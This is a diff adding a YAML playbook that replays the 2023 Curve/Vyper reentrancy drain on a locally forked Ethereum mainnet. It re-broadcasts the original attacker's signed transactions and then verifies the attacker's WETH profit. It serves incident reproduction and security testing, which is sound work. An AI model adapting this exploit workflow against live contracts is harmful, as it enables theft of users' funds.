@@ -1,0 +1,114 @@
+# Historical incident replay: Curve/Vyper reentrancy (2023-07-30).
+#
+# Forks mainnet at block 17806055 (attacker EOA at nonce 167, attack
+# contract deployed) and re-broadcasts the original attacker's 3 signed
+# historical transactions against the JPEG'd pETH/ETH pool — the first
+# drain of the Vyper reentrancy-lock incident (~$11M of the ~$70M).
+# Same signatures + same nonces + same state = deterministic
+# reproduction, with zero transactions ever touching mainnet.
+#
+# Run from the repo root (requires foundry; archive-capable fork RPC —
+# override with FORK_URL if the default is rate-limited):
+#   bin/blocktack campaign \
+#     --target corpus/curve-vyper-2023/target.yaml \
+#     --playbook playbooks/evm/curve-vyper-incident-replay.yaml
+apiVersion: blocktack/v1
+kind: Playbook
+name: curve-vyper-incident-replay
+description: >
+  Replays the original attacker's drain of the JPEG'd pETH/ETH Curve
+  pool (2023-07-30, BTV-L2-012 — Vyper 0.2.15 broken reentrancy locks):
+  an 80k WETH Balancer flash loan funds the reentrancy attack, netting
+  6,106.75 WETH swept to the attacker EOA.
+target:
+  chainTypes: [evm]
+  layers: [L2]
+steps:
+  - id: env-up
+    name: Fork mainnet at the pre-attack block
+    tactic: setup
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          anvil --fork-url "${FORK_URL:-https://eth.drpc.org}" \
+            --fork-block-number 17806055 --port 8545
+      background: true
+
+  - id: wait-for-rpc
+    name: Wait for the fork to accept requests
+    tactic: setup
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          for i in $(seq 1 100); do
+            cast block-number --rpc-url http://127.0.0.1:8545 >/dev/null 2>&1 && exit 0
+            sleep 1
+          done
+          echo "anvil fork did not come up" >&2
+          exit 1
+
+  - id: identify-chain
+    name: Fingerprint the fork
+    tactic: discover
+    run:
+      type: engine
+      engine: blocktack-evm
+      action: fingerprint
+
+  - id: balances-before
+    name: Record attacker WETH balance before the replay
+    tactic: discover
+    run:
+      type: engine
+      engine: blocktack-evm
+      action: erc20-balance
+      options:
+        token: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2" # WETH
+        accounts:
+          - "0x6Ec21d1868743a44318c3C259a6d4953F9978538" # attacker EOA
+          - "0x9420F8821aB4609Ad9FA514f8D2F5344C3c0A6Ab" # attack contract
+
+  - id: replay-transactions
+    name: Re-broadcast the attacker's 3 signed transactions in order
+    tactic: exploit
+    precondition: fork block 17806055 — attacker EOA at nonce 167 so historical signatures execute identically
+    run:
+      type: shell
+      command: sh
+      args:
+        - "-c"
+        - |
+          set -e
+          for f in corpus/curve-vyper-2023/transactions/*.raw; do
+            name="$(basename "$f")"
+            raw="$(tr -d '[:space:]' < "$f")"
+            echo "publishing $name"
+            cast publish --rpc-url http://127.0.0.1:8545 "$raw"
+          done
+          echo "all transactions published"
+
+  - id: balances-after
+    name: Verify attacker WETH profit after the replay
+    tactic: verify
+    run:
+      type: engine
+      engine: blocktack-evm
+      action: erc20-balance
+      options:
+        token: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2" # WETH
+        accounts:
+          - "0x6Ec21d1868743a44318c3C259a6d4953F9978538" # attacker EOA
+          - "0x9420F8821aB4609Ad9FA514f8D2F5344C3c0A6Ab" # attack contract
+        minProfit: "6000000000000000000000" # 6,000 WETH
+
+verification:
+  - id: transactions-executed
+    expects: all 3 vendored raw transactions publish with status=1 on the fork
+  - id: profit-materialized
+    expects: attacker EOA holds 6,106.751307562450092427 WETH — exact match to the wei against the mainnet record
